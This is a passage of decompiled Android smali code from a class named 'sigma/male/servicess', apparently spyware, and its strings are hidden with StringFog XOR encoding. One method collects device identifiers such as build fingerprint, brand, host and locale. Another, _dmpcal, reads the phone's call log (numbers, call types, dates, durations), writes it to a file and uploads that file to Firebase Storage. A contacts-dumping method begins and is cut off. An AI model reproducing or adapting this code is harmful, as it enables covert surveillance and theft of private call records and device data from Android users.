    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/Locale;->getDisplayLanguage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "aTY0EwQ3ag=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 940
    const-string v3, "Bjc0SF07dBRISzo4M1lROjp8DQR6Nng="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "LQ=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTY0EwQ3ag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    .line 942
    const-string v1, "AS02SAJ1aGlPBg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->TYPE:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTY0EwQ3ag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "ACcjXwJ1aGlPBg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->USER:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTY0EwQ3ag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "FxUVaAJ1aGlPBg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTY0EwQ3ag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "HBoFf30YEQh5eRluZhEXN2o="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build$VERSION;->INCREMENTAL:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTY0EwQ3ag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "BhANFwR6NngN"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTY0EwQ3ag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "FxsHf3xvdHoCWms="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->BOARD:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTY0EwQ3ag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "FwYHY3xvaGlPBnU="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTY0EwQ3ag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "HRsVeQJ1aGlPBg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->HOST:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTY0EwQ3ag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "Ex0Ian0HBBRkdgFuZhEXN2o="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTY0EwQ3ag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "AzE0XlE6OmZuVzExfA0EejZ4"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v1, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aXsiRE5r"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    .line 936
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 944
    const-string v0, "MTEwRFswPShLVw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 945
    return-void
.end method

.method public _dmpcal()V
    .locals 14

    .prologue
    const/4 v2, 0x0

    .line 715
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    .line 716
    new-instance v6, Ljava/lang/StringBuffer;

    invoke-direct {v6}, Ljava/lang/StringBuffer;-><init>()V

    .line 717
    const-string v1, "aTwyQFRraCtITDR0KExVMGlhW1EwIzZCSiFzZk5XOyAjQ0xoczFEXCE8e0ldIz0lSBUiPSJZUHl0L0NRIT0nQRUmNydBXWhlYRMYaScyVFQwamZPVzEtPUBZJzMvQwJlbzZMXDE9KEoCZW8kTFs+MzRCTTswfA5bNjc7A1Q6LzFEXCE8fE5ZOTduFABwdGsNDmUkPgQDJTs1REw8OygXSjA4J1lRIzF9RV08My5ZAjQhMkIDJTUiSVE7M2tPVyEgKUACYCQ+Fkg0MCJEVjJ5MkJIb2VzXUBuJCdJXDw6IQBUMDIyFw5lJD4WWjQ3LUpKOiEoSQJ2MiBLAzg1NEpRO24nWEw6byRCSjExNABKNDAvWEtvZXZdQG45J19fPDprWVclbnNdQCh6KkIYPDkhVl45OydZAjkxIFkDPTEvSlAhbnUdSC1vMURcITx8HgglLH1dVyY9MkRXO24nT0s6ODNZXW4gKV0CbSQ+FlQwMjIXCWUkPlAWOTtmXkg0Oj1LVDo1MhdKPDMuWQM4NTRKUTt5NERfPSB8HwglLDsRFyYgP0Fda2gkQlwsag=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v6, v1}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 718
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    sget-object v1, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    .line 719
    const-string v3, "MTUySBgRERVu"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    move-object v3, v2

    move-object v4, v2

    .line 718
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    .line 720
    const-string v0, "OyErT10n"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v3, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    .line 721
    const-string v0, "IS02SA=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v3, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    .line 722
    const-string v0, "MTUySA=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v3, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    .line 723
    const-string v0, "MSE0TEw8Oyg="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-interface {v3, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    .line 724
    :goto_0
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_1

    .line 750
    invoke-interface {v3}, Landroid/database/Cursor;->close()V

    .line 757
    :try_start_0
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "ejcnQVR7PDJAVA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/FileUtil;->isExistFile(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 758
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "ejcnQVR7PDJAVA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lsigma/male/FileUtil;->deleteFile(Ljava/lang/String;)V

    .line 760
    :cond_0
    new-instance v0, Ljava/io/FileOutputStream;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "ejcnQVR7PDJAVA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    invoke-direct {v0, v1, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/lang/String;Z)V

    .line 762
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "\n\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/FileOutputStream;->write([B)V

    .line 763
    invoke-virtual {v0}, Ljava/io/FileOutputStream;->close()V

    .line 767
    iget-object v0, p0, Lsigma/male/servicess;->sigmamale:Lcom/google/firebase/storage/StorageReference;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-static {v1}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "ejcnQVR7PDJAVA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageReference;->child(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lsigma/male/FileUtil;->getPackageDataDir(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "ejcnQVR7PDJAVA=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageReference;->putFile(Landroid/net/Uri;)Lcom/google/firebase/storage/UploadTask;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/UploadTask;->addOnFailureListener(Lcom/google/android/gms/tasks/OnFailureListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageTask;->addOnProgressListener(Lcom/google/firebase/storage/OnProgressListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v0

    new-instance v1, Lsigma/male/servicess$24;

    invoke-direct {v1, p0}, Lsigma/male/servicess$24;-><init>(Lsigma/male/servicess;)V

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageTask;->continueWithTask(Lcom/google/android/gms/tasks/Continuation;)Lcom/google/android/gms/tasks/Task;

    move-result-object v0

    .line 771
    iget-object v1, p0, Lsigma/male/servicess;->_sigmamale_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    invoke-virtual {v0, v1}, Lcom/google/android/gms/tasks/Task;->addOnCompleteListener(Lcom/google/android/gms/tasks/OnCompleteListener;)Lcom/google/android/gms/tasks/Task;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 786
    :goto_1
    return-void

    .line 725
    :cond_1
    invoke-interface {v3, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 726
    invoke-interface {v3, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    .line 727
    invoke-interface {v3, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    .line 728
    new-instance v10, Ljava/util/Date;

    invoke-static {v0}, Ljava/lang/Long;->valueOf(Ljava/lang/String;)Ljava/lang/Long;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v12

    invoke-direct {v10, v12, v13}, Ljava/util/Date;-><init>(J)V

    .line 729
    invoke-interface {v3, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v11

    .line 731
    const-string v0, ""

    .line 732
    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    .line 733
    packed-switch v1, :pswitch_data_0

    move-object v1, v2

    .line 748
    :goto_2
    new-instance v12, Ljava/lang/StringBuilder;

    const-string v13, "aTAvWxg2OCdeS2hzKkIfdWp6RFUydDVfW2hz"

    invoke-static {v13}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    invoke-direct {v12, v13}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v12, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v12, "cnQnQUxocw=="

    invoke-static {v12}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "cnR4EVpr"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aXskExhpJzZMVms="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "dQcjTgR6JzZMVmtoJF8GaTY0Ew=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aXsiRE5r"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    goto/16 :goto_0

    .line 735
    :pswitch_0
    const-string v0, "GgESanccGgE="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 736
    const-string v0, "PSAyXUtve2lLUScxJExLMCcyQko0MyMDXzo7IUFdNCQvXhY2OysCTmV7JAJPPT0ySBVnNiUYXns1Nl1LJTsyA1s6OWlCFxoBEmp3HBoBA0g7M3lMVCFpK0hcPDVgWVc+MSgQD2ZsJx4LMG1rGwhhbWsZWW1saxQMYWRrHlk2YiAVADBncB5b"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    .line 739
    :pswitch_1
    const-string v0, "HBoFYnUcGgE="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 740
    const-string v0, "PSAyXUtve2lLUScxJExLMCcyQko0MyMDXzo7IUFdNCQvXhY2OysCTmV7JAJPPT0ySBVnNiUYXns1Nl1LJTsyA1s6OWlCFxwaBWJ1HBoBA0g7M3lMVCFpK0hcPDVgWVc+MSgQXWNidk4MYmxrFVxlbWsZXjNsaxQNZDFrTghkNX8bCjM1Ik4M"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    .line 744
    :pswitch_2
    const-string v0, "GB0Vfn0R"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 745
    const-string v0, "PSAyXUtve2lLUScxJExLMCcyQko0MyMDXzo7IUFdNCQvXhY2OysCTmV7JAJPPT0ySBVnNiUYXns1Nl1LJTsyA1s6OWlCFxgdFX59EXo2Q19qNSpZBTgxIkRZcyApRl07aSNPXWxgfhoOeDV1TAx4YHEbDXhsdksNeDcjFV1nN3IVDGVhcA=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :catch_0
    move-exception v0

    goto/16 :goto_1

    .line 776
    :catch_1
    move-exception v0

    goto/16 :goto_1

    .line 733
    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_1
        :pswitch_0
        :pswitch_2
    .end packed-switch
.end method

.method public _dmpcon()V
    .locals 8

    .prologue
    const/4 v4, 0x0

    const/4 v7, 0x1

    .line 790
